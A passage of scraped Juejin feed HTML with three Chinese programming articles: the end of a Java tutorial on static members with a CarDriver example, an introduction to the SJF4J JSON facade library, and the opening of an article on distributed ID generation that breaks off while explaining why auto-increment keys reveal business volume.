</code></pre>
<h3 data-id="heading-49">✅ 优化后 CarDriver 类（静态变量 + 实例变量）</h3>
<p>java</p>
<p>运行</p>
<pre><code class="hljs language-typescript" lang="typescript">package com.<span class="hljs-property">shehuiuniversity</span>;
<span class="hljs-keyword">import</span> java.<span class="hljs-property">util</span>.<span class="hljs-property">Scanner</span>;
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CarDriver</span> {
    <span class="hljs-comment">// 静态变量：所有司机共享</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-title class_">String</span> job = <span class="hljs-string">"汽车司机"</span>;
    <span class="hljs-comment">// 实例变量：每个司机独有</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> name;
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> gender;
    <span class="hljs-keyword">private</span> int age;
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> license;
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> carNum;

    <span class="hljs-comment">// set/get方法</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setName</span>(<span class="hljs-params"/>) {
        <span class="hljs-title class_">Scanner</span> sc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(<span class="hljs-title class_">System</span>.<span class="hljs-property">in</span>);
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"请输入姓名："</span>);
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = sc.<span class="hljs-title function_">nextLine</span>();
    }
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setGender</span>(<span class="hljs-params"/>) {
        <span class="hljs-title class_">Scanner</span> sc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(<span class="hljs-title class_">System</span>.<span class="hljs-property">in</span>);
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"请输入性别："</span>);
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">gender</span> = sc.<span class="hljs-title function_">nextLine</span>();
    }
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setAge</span>(<span class="hljs-params"/>) {
        <span class="hljs-title class_">Scanner</span> sc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(<span class="hljs-title class_">System</span>.<span class="hljs-property">in</span>);
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"请输入年龄："</span>);
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = sc.<span class="hljs-title function_">nextInt</span>();
        sc.<span class="hljs-title function_">nextLine</span>();
    }
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setLicense</span>(<span class="hljs-params"/>) {
        <span class="hljs-title class_">Scanner</span> sc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(<span class="hljs-title class_">System</span>.<span class="hljs-property">in</span>);
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"请输入驾驶证号："</span>);
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">license</span> = sc.<span class="hljs-title function_">nextLine</span>();
    }
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setCarNum</span>(<span class="hljs-params"/>) {
        <span class="hljs-title class_">Scanner</span> sc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(<span class="hljs-title class_">System</span>.<span class="hljs-property">in</span>);
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"请输入车牌号："</span>);
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">carNum</span> = sc.<span class="hljs-title function_">nextLine</span>();
    }
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getName</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> name; }
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getGender</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> gender; }
    <span class="hljs-keyword">public</span> int <span class="hljs-title function_">getAge</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> age; }
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getLicense</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> license; }
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getCarNum</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> carNum; }

    <span class="hljs-comment">// 实例方法</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">wayToDrive</span>(<span class="hljs-params"/>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(name + <span class="hljs-string">"("</span> + job + <span class="hljs-string">")正在开车牌号为"</span> + carNum + <span class="hljs-string">"的车"</span>);
    }

    <span class="hljs-comment">// toString方法</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">toString</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"【"</span>+job+<span class="hljs-string">"信息】\n姓名："</span>+name+<span class="hljs-string">"\n性别："</span>+gender+<span class="hljs-string">"\n年龄："</span>+age+<span class="hljs-string">"\n驾驶证号："</span>+license+<span class="hljs-string">"\n车牌号："</span>+carNum;
    }
}
</code></pre>
<h3 data-id="heading-50">✅ 测试类</h3>
<p>java</p>
<p>运行</p>
<pre><code class="hljs language-ini" lang="ini">package com.Testclass<span class="hljs-comment">;</span>
import com.shehuiuniversity.MyMath<span class="hljs-comment">;</span>
import com.shehuiuniversity.CarDriver<span class="hljs-comment">;</span>
public class TestAll {
    public static void main(String<span class="hljs-section">[]</span> args) {
        // 调用静态方法：无需创建对象
        MyMath.add(10,20)<span class="hljs-comment">;</span>
        MyMath.compare(0.1,0.5,0.3)<span class="hljs-comment">;</span>
        
        // 调用静态变量：类名调用
        System.out.println("职业：" + CarDriver.job)<span class="hljs-comment">;</span>
        
        // 创建对象调用实例方法
        CarDriver <span class="hljs-attr">driver</span> = new CarDriver()<span class="hljs-comment">;</span>
        driver.setName()<span class="hljs-comment">;</span>
        driver.setGender()<span class="hljs-comment">;</span>
        driver.setAge()<span class="hljs-comment">;</span>
        driver.setLicense()<span class="hljs-comment">;</span>
        driver.setCarNum()<span class="hljs-comment">;</span>
        System.out.println(driver)<span class="hljs-comment">;</span>
        driver.wayToDrive()<span class="hljs-comment">;</span>
    }
}
</code></pre>
<p>至此，<code>static</code>的所有核心知识点你就全部掌握了，这是 Java 基础的重中之重</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SJF4J 五分钟入门：Java 的实用 JSON 门面]]></title>    <link>https://juejin.cn/post/7595772638880776243</link>    <guid>https://juejin.cn/post/7595772638880776243</guid>    <pubDate>2026-01-16T09:34:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595772638880776243" data-draft-id="7595774188909772838" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SJF4J 五分钟入门：Java 的实用 JSON 门面"/> <meta itemprop="keywords" content="Java,JSON"/> <meta itemprop="datePublished" content="2026-01-16T09:34:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="信码由缰"/> <meta itemprop="url" content="https://juejin.cn/user/2110664941509214"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SJF4J 五分钟入门：Java 的实用 JSON 门面
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2110664941509214/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    信码由缰
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-16T09:34:07.000Z" title="Fri Jan 16 2026 09:34:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Java 中的 JSON 处理很少是简单的。</p>
<p>在实际应用中，数据不断在以下形式之间流转：</p>
<ul>
<li>
<p>POJO（普通Java对象）</p>
</li>
<li>
<p>Map / List</p>
</li>
<li>
<p>JSON 字符串</p>
</li>
<li>
<p>配置文件</p>
</li>
<li>
<p>模式不断演进的 API</p>
</li>
</ul>
<p>Java 开发者常常被迫做出痛苦的选择：</p>
<blockquote>
<p><strong>要么要类型安全，要么要灵活性——二者不可兼得。</strong></p>
</blockquote>
<p><img src="https://cf-blog.icodebuddy.com/image/104/104-0.png" alt="" loading="lazy"/></p>
<p><strong>SJF4J（Java 简单 JSON 门面）</strong> 就是为了消除这种取舍而构建的。</p>
<h2 data-id="heading-0">SJF4J 是什么？</h2>
<p>SJF4J 是流行 JSON 库（Jackson、Gson、Fastjson2）及相关格式（YAML、Properties）之上的一个轻量级门面。它提供一个用于<strong>结构化数据处理的统一语义层</strong>，完全基于 JSON 规范。它<strong>不</strong>替代你的 JSON 解析器，而是在它们<em>之上</em>统一你的结构化数据处理方式。</p>
<h2 data-id="heading-1">核心理念：基于对象的节点树</h2>
<p>SJF4J 没有引入自定义的 JSON AST（抽象语法树），而是将<strong>现有的 Java 对象视为 JSON 节点</strong>。这被称为<strong>基于对象的节点树[Object-Based Node Tree (OBNT)]</strong>。</p>
<p>在 OBNT 中：</p>
<ul>
<li>
<p>JSON 对象 → JsonObject、Map、POJO</p>
</li>
<li>
<p>JSON 数组 → JsonArray、List、数组</p>
</li>
<li>
<p>JSON 值 → Java 原生类型</p>
</li>
</ul>
<p>一切都保持为<strong>普通的 Java 对象</strong>，只是在上层附加了 JSON 语义。</p>
<h2 data-id="heading-2">快速示例</h2>
<pre><code class="hljs language-java" lang="java">
<span class="hljs-type">JsonObject</span> <span class="hljs-variable">jo</span> <span class="hljs-operator">=</span> JsonObject.fromJson(<span class="hljs-string">"""

{

"id": 1,

"active": true

}

"""</span>);

  


<span class="hljs-type">int</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> jo.getInt(<span class="hljs-string">"id"</span>); <span class="hljs-comment">// 类型安全</span>

<span class="hljs-type">String</span> <span class="hljs-variable">active</span> <span class="hljs-operator">=</span> jo.asString(<span class="hljs-string">"active"</span>); <span class="hljs-comment">// Boolean → String 转换</span>

</code></pre>
<p>SJF4J 提供三种访问级别：</p>
<ul>
<li>
<p><code>getNode</code> → 原始访问</p>
</li>
<li>
<p><code>getXxx</code> → 类型安全访问</p>
</li>
<li>
<p><code>asXxx</code> → 语义访问，支持跨类型转换</p>
</li>
</ul>
<p>你可以为每次调用选择严格程度。</p>
<h2 data-id="heading-3">基于路径的访问（符合 RFC 规范）</h2>
<p>SJF4J 完全支持：</p>
<ul>
<li>
<p>JSON 路径（RFC 9535）</p>
</li>
<li>
<p>JSON 指针（RFC 6901）</p>
</li>
</ul>
<pre><code class="hljs language-java" lang="java">
<span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> jo.asByPath(<span class="hljs-string">"$.user.name"</span>);

List&lt;Integer&gt; ids = jo.findByPath(<span class="hljs-string">"$.items[*].id"</span>, Integer.class);

</code></pre>
<p>同样的路径 API 适用于：</p>
<ul>
<li>
<p>JSON</p>
</li>
<li>
<p>Map / List</p>
</li>
<li>
<p>POJO</p>
</li>
<li>
<p>混合对象图</p>
</li>
</ul>
<h2 data-id="heading-4">动态 + 类型化：JOJO</h2>
<p>SJF4J 引入了 JOJO（JSON 对象 Java 对象）—— 一个扩展了 JsonObject 的领域对象。</p>
<pre><code class="hljs language-java" lang="java">
<span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">JsonObject</span> {

String name;

}

user.getName(); <span class="hljs-comment">// 类型化访问</span>

user.getString(<span class="hljs-string">"age"</span>); <span class="hljs-comment">// 动态访问</span>

user.findByPath(<span class="hljs-string">"$..name"</span>); <span class="hljs-comment">// JSON 语义访问</span>

</code></pre>
<p>你可以从动态访问开始，逐步添加结构 —— 而无需破坏 API。</p>
<h2 data-id="heading-5">使用 JsonPatch 进行声明式转换</h2>
<p>SJF4J 支持：</p>
<ul>
<li>
<p>JSON 补丁（RFC 6902）</p>
</li>
<li>
<p>JSON 合并补丁（RFC 7386）</p>
</li>
</ul>
<pre><code class="hljs language-java" lang="java">
<span class="hljs-type">JsonPatch</span> <span class="hljs-variable">patch</span> <span class="hljs-operator">=</span> JsonPatch.diff(source, target);

patch.apply(source);

</code></pre>
<p>补丁操作在 POJO、Map、List 和 JSON 对象上统一工作。</p>
<h2 data-id="heading-6">SJF4J 何时大放异彩？</h2>
<p>如果你符合以下情况，SJF4J 是理想选择：</p>
<ul>
<li>
<p>处理不断演进或半结构化的数据</p>
</li>
<li>
<p>既需要灵活性又需要类型安全</p>
</li>
<li>
<p>希望在多个 JSON 库上使用统一的 API</p>
</li>
<li>
<p>关注 JSON 规范</p>
</li>
</ul>
<h2 data-id="heading-7">总结</h2>
<p>SJF4J 让面向 JSON 的 Java 开发成为可能 —— 无需过早锁定方案或编写过多样板代码。</p>
<p>它小巧、可组合，并且由规范驱动。</p>
<p>👉 GitHub: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsjf4j-projects%2Fsjf4j" target="_blank" title="https://github.com/sjf4j-projects/sjf4j" ref="nofollow noopener noreferrer">github.com/sjf4j-proje…</a></p>
<hr/>
<p>【注】本文译自：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdev.to%2Fhannyu%2Fsjf4j-in-5-minutes-a-practical-json-facade-for-java-j73" target="_blank" title="https://dev.to/hannyu/sjf4j-in-5-minutes-a-practical-json-facade-for-java-j73" ref="nofollow noopener noreferrer">SJF4J in 5 Minutes: A Practical JSON Facade for Java</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[一站式了解全局分布式生成ID方案]]></title>    <link>https://juejin.cn/post/7595603381663760390</link>    <guid>https://juejin.cn/post/7595603381663760390</guid>    <pubDate>2026-01-16T09:16:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595603381663760390" data-draft-id="7591969856577404978" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="一站式了解全局分布式生成ID方案"/> <meta itemprop="keywords" content="后端,面试,架构"/> <meta itemprop="datePublished" content="2026-01-16T09:16:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="想用offer打牌"/> <meta itemprop="url" content="https://juejin.cn/user/578781641968972"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            一站式了解全局分布式生成ID方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/578781641968972/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    想用offer打牌
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-16T09:16:53.000Z" title="Fri Jan 16 2026 09:16:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.8;font-weight:400;font-size:16px;word-spacing:2px;letter-spacing:2px;overflow-x:hidden;color:#3e3e3e;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{padding-bottom:12px;font-size:24px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:1.2em;border-bottom:2px solid #ef7060;word-spacing:0!important;letter-spacing:0!important;font-size:inherit;line-height:inherit;display:block;font-weight:400;background:#ef7060;color:#fff;padding:10px;border-top-right-radius:3px;border-top-left-radius:3px;margin-right:3px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="monokai">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#272822;color:#ddd}.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-strong,.hljs-tag{color:#f92672}.hljs-code{color:#66d9ef}.hljs-class .hljs-title{color:#fff}.hljs-attribute,.hljs-link,.hljs-regexp,.hljs-symbol{color:#bf79db}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-emphasis,.hljs-section,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-string,.hljs-subst,.hljs-template-tag,.hljs-template-variable,.hljs-title,.hljs-type,.hljs-variable{color:#a6e22e}.hljs-comment,.hljs-deletion,.hljs-meta,.hljs-quote{color:#75715e}.hljs-doctag,.hljs-keyword,.hljs-literal,.hljs-section,.hljs-selector-id,.hljs-selector-tag,.hljs-title,.hljs-type{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>作为一名后端开发人员，理解分布式 ID 的演进过程，本质上是在理解如何在<strong>分布式 CAP 理论</strong>（一致性、可用性、分区容错性）中寻找性能与可靠性的平衡点。在分布式系统中，ID 不仅仅是一个数字。它是数据的唯一标识，是分库分表的路由依据，更是系统高性能运转的基石。所以，深度了解全局分布式生成ID的方案是非常有必要的，接下来让我们一起探讨一下吧！</p>
<h2 data-id="heading-1">为什么不能用自增主键？</h2>
<p>有同学说了，我们为啥不用数据库可以自增生成的主键呢？这样同时还能提高SQL的查询速度(B+树)。你先不急，不使用肯定是因为优先级高于这点优化的。</p>
<h3 data-id="heading-2">分布式系统中的困难</h3>
<p>在单机数据库中，自增主键（如 MySQL 的 <code>AUTO_INCREMENT</code>）简单高效。但在<strong>分布式系统</strong>中存在以下问题：</p>
<ul>
<li><strong>无法保证全局唯一</strong>：多个数据库实例各自维护自己的自增值，容易冲突。</li>
<li><strong>不利于分库分表</strong>：插入前不知道主键值，难以确定数据应路由到哪个分片。</li>
<li><strong>性能瓶颈</strong>：集中式生成器会成为单点瓶颈，高并发下承压太高。</li>
</ul>
<h3 data-id="heading-3">安全与业务风险</h3>
<p>除了提到的<strong>分布式系统中的技术限制</strong>（如全局唯一性、分片路由、性能瓶颈）之外，<strong>自增主键还有一个重要的安全和业务风险：容易被外部猜测出数据规律</strong>。这在很多实际业务场景中是不可接受的。</p>
<blockquote>
<p>据说,早期 Instagram 的照片 ID 是自增的，研究人员通过 ID 推算出其每日新增照片量，引发隐私争议。</p>
</blockquote>
<h4 data-id="heading-4"><strong>暴露业务规模</strong></h4>
<ul>
<li>
<p>比如一个电商网站的订单 ID 是 <code>10001</code>、<code>10002</code>……</p>
</li>
<li>
<p>竞争对手或用户通过观察 ID 增长速度，可以估算：</p>
<ul>
<li>每天/每小时的订单量</li>
<li>用户注册数量</li>
<li>内容发布频率（如帖子、评论数）</li>
